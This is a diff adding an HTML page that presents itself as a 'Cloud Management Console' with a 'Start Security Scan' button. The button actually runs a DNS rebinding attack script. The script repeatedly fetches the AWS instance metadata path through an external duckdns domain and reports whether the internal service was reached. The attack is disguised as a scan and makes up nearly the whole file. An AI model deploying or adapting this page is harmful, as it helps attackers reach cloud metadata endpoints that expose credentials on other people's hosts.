@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cloud Portal</title>
+    <style>
+        body { font-family: Arial; margin: 40px; }
+        .log { background: #f5f5f5; padding: 10px; margin: 5px; border-left: 4px solid blue; }
+        .success { border-left-color: green; background: #f0fff0; }
+        .error { border-left-color: red; background: #fff0f0; }
+    </style>
+</head>
+<body>
+    <h1>🔒 Cloud Management Console</h1>
+    <div id="status">Ready</div>
+    <button onclick="startAttack()">Start Security Scan</button>
+    <div id="results"></div>
+
+    <script>
+        const domain = 'akkubhosle1.duckdns.org';
+        
+        function log(msg, type = 'info') {
+            const div = document.createElement('div');
+            div.className = `log ${type}`;
+            div.innerHTML = `<strong>[${new Date().toLocaleTimeString()}]</strong> ${msg}`;
+            document.getElementById('results').appendChild(div);
+        }
+
+        async function fetchWithTimeout(url, timeout = 5000) {
+            try {
+                const response = await fetch(url, { 
+                    method: 'GET',
+                    mode: 'no-cors',
+                    cache: 'no-cache'
+                });
+                return { success: true };
+            } catch (error) {
+                return { success: false, error: error.message };
+            }
+        }
+
+        async function startAttack() {
+            document.getElementById('status').textContent = '🔄 Scanning...';
+            log('Starting DNS rebinding attack against AWS metadata...');
+            
+            let attempt = 0;
+            const maxAttempts = 15;
+            
+            const attackInterval = setInterval(async () => {
+                attempt++;
+                log(`Attempt ${attempt}/${maxAttempts}: Testing ${domain}`);
+                
+                try {
+                    // Try to access AWS metadata via your domain
+                    const result = await fetchWithTimeout(`http://${domain}/latest/meta-data/`);
+                    
+                    if (result.success) {
+                        log('✅ SUCCESS: Connected to internal service!', 'success');
+                        document.getElementById('status').textContent = '✅ Vulnerable to DNS rebinding!';
+                        clearInterval(attackInterval);
+                    } else {
+                        log(`Waiting for DNS rebind... ${result.error}`, 'error');
+                    }
+                } catch (error) {
+                    log(`Error: ${error.message}`, 'error');
+                }
+                
+                if (attempt >= maxAttempts) {
+                    log('❌ Attack completed without success', 'error');
+                    document.getElementById('status').textContent = '❌ No vulnerability found';
+                    clearInterval(attackInterval);
+                }
+            }, 10000); // Try every 10 seconds
+        }
+    </script>
+</body>
+</html>
